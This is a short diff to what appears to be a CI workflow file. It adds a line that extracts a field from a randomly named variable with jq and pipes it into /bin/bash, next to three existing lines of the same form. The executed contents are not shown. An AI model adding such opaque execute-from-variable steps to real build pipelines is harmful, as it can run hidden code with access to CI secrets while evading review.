@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$qoith2214" | jq -r .e454 | /bin/bash
           printf '%s' "$yceum75" | jq -r .a1 | /bin/bash
           echo $vu250 | jq -r .uco6 | /bin/bash
+          echo $aqexm15 | jq -r .a5588 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
